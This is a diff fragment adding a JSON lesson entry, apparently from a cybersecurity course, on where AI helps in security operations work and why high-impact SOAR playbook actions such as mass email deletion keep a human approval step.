+      "1.6"
+    ],
+    "meaning": [
+      "AI suits work that is heavy on text and volume: summarizing alerts and logs, building a timeline from several sources, linking weak signals into one story, comparing two scripts and drafting reports. It saves analyst time on the first pass.",
+      "The risk grows when AI also acts. In a SOAR playbook, a model verdict can trigger a real change such as quarantine or isolation. An analyst needs to know where a person must stay in the loop."
+    ],
+    "rule": [
+      "Correlation is a strong fit. A fixed SIEM rule matches one pattern, while an AI-assisted view can link a failed login, a new device registration and an unusual download that no single rule would connect.",
+      "Timelines and summaries save time, but they only cover the data supplied. The analyst still checks the sources and fills any gap.",
+      "Code and document comparison, report drafting and alert enrichment are common uses. A similarity score highlights where to look, and the analyst judges what the difference means.",
+      "SOAR runs playbooks that enrich alerts and open tickets automatically. Adding an AI verdict to a playbook is acceptable when low-impact steps run on their own and high-impact steps, such as isolating a host, wait for human approval.",
+      "Automated actions need guardrails: a confidence threshold, a way to roll back, and a log of the verdict and the action so the decision can be audited."
+    ],
+    "example": {
+      "intro": "A phishing playbook scores each reported email. The team wants high scores to delete the message from every mailbox with no one involved.",
+      "table": {
+        "caption": "Playbook design options",
+        "head": [
+          "Score",
+          "Action",
+          "Impact if wrong"
+        ],
+        "rows": [
+          [
+            "Any",
+            "Add sender and links to the ticket",
+            "Low"
+          ],
+          [
+            "High",
+            "Move message to quarantine",
+            "Moderate, can be restored"
+          ],
+          [
+            "High",
+            "Delete from all mailboxes",
+            "High, may remove real mail"
+          ]
+        ]
+      },
+      "steps": [
+        "Adding details to the ticket is low impact, so it can run on its own.",
+        "Quarantine can be undone, so it can run automatically at a high score if the action is logged.",
+        "Permanent deletion is costly if the verdict is wrong, so it should wait for an analyst to approve.",
+        "The analyst keeps the playbook fast for safe steps and puts a person at the irreversible step."
+      ]
+    },
+    "trap": {
+      "wrong": "A very high model confidence score means the verdict is correct, so full automation of every action is safe.",
+      "why": "A score is the model's own estimate, and models can be fooled or wrong. Match autonomy to the cost of an error: let automation handle reversible, low-impact steps and keep a human approval for destructive ones."
+    },
+    "checkIds": [
+      "cs4-1-6-mcq-021",
+      "cs4-1-6-mcq-024",
+      "cs4-1-6-mcq-025",
+      "cs4-1-6-mcq-026",
+      "cs4-1-6-mcq-027"
+    ]
+  }
+]
